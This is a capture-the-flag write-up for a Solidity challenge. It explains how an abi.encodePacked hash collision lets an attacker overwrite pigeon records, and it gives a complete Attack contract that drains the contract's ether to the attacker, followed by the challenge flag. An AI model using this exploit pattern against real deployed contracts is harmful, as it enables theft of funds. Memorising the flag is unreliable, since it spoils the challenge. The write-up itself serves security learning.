# Operation Feathered

## Challenge 

The challenge is based on the ParadigmCTF framework. The description can be found in "./description.md".
We receive the setup as well as the pigeon contract.

## Analysis

- contract for managing pigeons of different tiers (junio, associate, senior)
- pigeons have to fulfill tasks to increase their points

### Functions
#### constructor()

sets owner and values for the promotions

### becomeAPigeon(string memory code, string memory name)
reverts if:
- codeToName[code][name] is true, which is either set to true in this function or in assignPigeon().
- isPigeon[msg.sender] is true

functionality:
- hashes code and name together to generate codeName (reproducible)
- sets juniorPigeon at the generated codename to the address of the msg sender
- sets isPigeon[msg.sender] to true
- sets codeToName[code][name] to true (which will trigger the revert if we call this fun again with the same value)

### task(bytes32 codeName, address person, uint256 data)
reverts if:
- !isPigeon[myśg.sender]
- person == address(0)
- isPigeon[person]
- person.balance != data

functionality
- increases taskpoints of the given codeName by points

### flyAway(bytes32 codeName, uint256 rank)
reverts if:
- !isPigeon[msg.sender]
- rank == 0 && taskPoints[codeName] > juniorPromotion
- rank == 1 && taskPoints[codeName] > associatePromotion

functionality:
- sends the treasury[codeName] to the tiers mapping[codeName]


### promotion(bytes32 codeName, uint256 desiredRank, string memory newCode, string memory newName)
reverts if:
- !isPigeon[myg.sender]
- msg.sender is not in the list corresponding to its rank
- taskPoints are less than the ones needed for the rank
- codeToName[newCode][newName] exists

functionality:
- increases the owner balance by the value of the treasury at the codename
- sets the ranks mapping[newCodeName] at to msg.sender
- resets the taskpoints of the old codename to 0
- deletes the old codename from its old ranks mapping
- transfers the treasury of the old codename to the owner

### assignPigeon(string memory code, string memory name, address pigeon, uint256 rank)
reverts if:
- owner != msg.sender

functionality:
- add a pigeon of arbitrary rank

## Debugging
To make it easier to debug I used my  [ParadigmCTF Debug Template](https://github.com/J4X-98/SolidityCTFToolkit/blob/main/forge/paradigmTester.sol) which uses forge. I adapted it to fit the challenge and was able to debug pretty efficiently:

```solidity
// Description:
// A forge test case that you can use to easily debug challenges that were built using the Paradigm CTF framework.


// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "../src/Pigeon.sol";
import "../src/Attack.sol";
//Import all needed contracts here (they are usually stored in /src in your foundry directory)

contract ParadigmTest is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    //Initialize any additional needed variables here
    Pigeon public pigeon;

    function setUp() public {
        vm.deal(deployer, 1337 ether);
        vm.startPrank(deployer);

        //Copy all code from the Setup.sol constructor() function into here
        pigeon = new Pigeon();

        // Junior Pigeons
        pigeon.assignPigeon("Numbuh", "6", address(0x006), 0);
        pigeon.assignPigeon{value: 5e18}("Numbuh", "5", address(0x005), 0);

        pigeon.assignPigeon("Numbuh", "4", address(0x004), 1);
        pigeon.assignPigeon{value: 10e18}("Numbuh", "3", address(0x003), 1);

        pigeon.assignPigeon("Numbuh", "2", address(0x002), 2);
        pigeon.assignPigeon{value: 15e18}("Numbuh", "1", address(0x001), 2);

        vm.stopPrank();
    }

    function test() public {
        vm.deal(attacker, 5 ether); //30 eth are the standard for the paradigm framework but could be configured differently
        vm.startPrank(attacker);

        //Code your solution here
        Attack atk = new Attack(address(pigeon));

        atk.attack();

        vm.stopPrank();
        
        assertEq(isSolved(), true);
    }

    function isSolved() public view returns (bool) {
        //Copy the content of the isSolved() function from the Setup.sol contract here (maybe needs adaption if it includes msg.sender, then just change it to the attacker variable)
        return attacker.balance >= 34 ether && address(pigeon).balance == 0 ether;
        return false;
    }
}
```

## Solution

### What do we need to achieve?
address(msg.sender).balance >= 34 ether && address(pigeon).balance == 0 ether;

So we need to empty out the whole contract and get all the pigeons' money.

### What's the problem

In the becomeAPigeon(), we only check for the exact combination of name & code to protect against double use. So we check for "Numbuh" and "6" not being used again. The problem is that as the 2 strings get concatenated and hashed afterward to create the codename, you can just generate the same codename from a different combination of the strings, like "Numb" and "uh6". 

When you know this it gets pretty easy, you just overwrite the pigeons one by one while increasing your points using the task function. This function seems a bit complicated at the start but is pretty easy after ignoring all the irrelevant stuff inside it.

### Solve Script

To solve the challenge I wrote an Attack contract that does everything for me:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./Pigeon.sol";

contract Attack {
    Pigeon target;

    constructor(address _target) 
    {
        
        target = Pigeon(_target);
    }

    function attack() public
    {
        //so we are able to achieve the task points afterwards
        bytes32 codename1 = keccak256(abi.encodePacked("Numbuh", "5"));
        bytes32 codename2 = keccak256(abi.encodePacked("Numbuh", "3"));
        bytes32 codename3 = keccak256(abi.encodePacked("Numbuh", "1"));

        //get the money of the first pigeon by overwriting the juniorPigeon[Codename]
        target.becomeAPigeon("Num", "buh5");
        target.flyAway(codename1, 0);

        //Send all the money to the attacker
        msg.sender.call{value: address(this).balance}("");

        //upgrade
        target.task(codename1, msg.sender, msg.sender.balance);
        target.promotion(codename1, 1, "Num", "buh3");
        target.flyAway(codename2, 1);

        //Send all the money to the attacker
        msg.sender.call{value: address(this).balance}("");

        target.task(codename2, msg.sender, msg.sender.balance);
        target.promotion(codename2, 2, "Num", "buh1");
        target.flyAway(codename3, 2);

        //Send all the money to the attacker
        msg.sender.call{value: address(this).balance}("");
    }

    receive() payable external
    {

    }
}
```

SEE{c00_c00_5py_squ4d_1n_act10n_9fbd82843dced19ebb7ee530b540bf93}
